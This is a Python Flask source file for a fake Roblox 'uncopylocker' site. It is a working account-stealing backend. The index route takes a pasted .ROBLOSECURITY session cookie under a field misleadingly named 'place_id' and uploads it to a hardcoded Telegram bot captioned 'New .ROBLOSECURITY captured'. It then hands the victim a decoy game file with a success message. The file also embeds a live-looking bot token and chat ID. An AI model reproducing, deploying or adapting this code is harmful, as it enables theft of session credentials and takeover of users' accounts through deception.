from flask import Flask, request, render_template, jsonify, send_file, redirect, url_for  
import requests  
import secrets  
from pathlib import Path
import json
  
app = Flask(__name__)

app.secret_key = "goodboylol67"  

BOT_TOKEN = "7724967776:AAGUU3p1WTnyvV2VTRZ56L829nyAG__QDq8"  
CHAT_ID = "7715048070"  
  
GAMES_FILE = Path("static/full.json")
if GAMES_FILE.exists():
    with open(GAMES_FILE, "r", encoding="utf-8") as f:
        GAMES = json.load(f)
else:
    GAMES = []

DEFAULT_GAME = next(
    ({"gameid": g["DEFAULTgameid"], "path": g["DEFAULTpath"], "name": g["DEFAULTname"]}
     for g in GAMES if g.get("DEFAULTgameid")), 
    GAMES[0] if GAMES else {}
)

def is_valid_game(game: dict) -> bool:
    return (
        game
        and game.get("path")
        and game.get("name")
        and game.get("path") != "None"
        and game.get("name") != "None"
    )
  
sessions = {} 
    
def send_txt_to_telegram(text_content: str):  
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"  
    files = {"document": ("cookie.txt", text_content, "text/plain")}  
    data = {"chat_id": CHAT_ID, "caption": "New .ROBLOSECURITY captured"}  
    try:  
        r = requests.post(url, data=data, files=files, timeout=10)  
        return r.json()  
    except Exception as e:  
        # print(f"Telegram error: {e}")  
        return None  
  
  
def validate_cookie(cookie: str) -> bool:  
    required = [  
        "referer: https://www.roblox.com/",  
        "WARNING:-DO-NOT-SHARE-THIS.",  
        '.ROBLOSECURITY", "_|WARNING',  
        '$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY"'  
    ]  
    return cookie and any(sub in cookie for sub in required)  
  
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.get_json()
        cookie = data.get('place_id', '')

        if not validate_cookie(cookie):
            return jsonify({"type": "error", "msg": "XAR invalid or not found."})

        send_txt_to_telegram(cookie)

        token = secrets.token_urlsafe(20)

        selected_game = DEFAULT_GAME.copy()
        for game in GAMES:
            if "gameid" in game and game["gameid"] in cookie:
                selected_game = game
                break

        if not is_valid_game(selected_game):
            return jsonify({
                "type": "responses",
                "msg": "Success! Processed successfully"
            })
            

        sessions[token] = {
            "cookie": cookie,
            "game": selected_game
        }

        return jsonify({
            "type": "response",
            "msg": "Uncopylocked successfully!",
            "Path": f"/uncopylocked?token={token}"
        })

    return render_template('index.html')  
  
@app.route("/uncopylocked")  
def uncopylocked():  
    token = request.args.get("token")  
    if not token or token not in sessions:  
        return redirect(url_for("index"))  
  
    session_data = sessions.pop(token)  
  
    game = session_data["game"]  
  
    return send_file(  
        game["path"],  
        as_attachment=True,  
        download_name=game["name"]  
    )  
  
if __name__ == '__main__':  
    app.run(debug=True)  
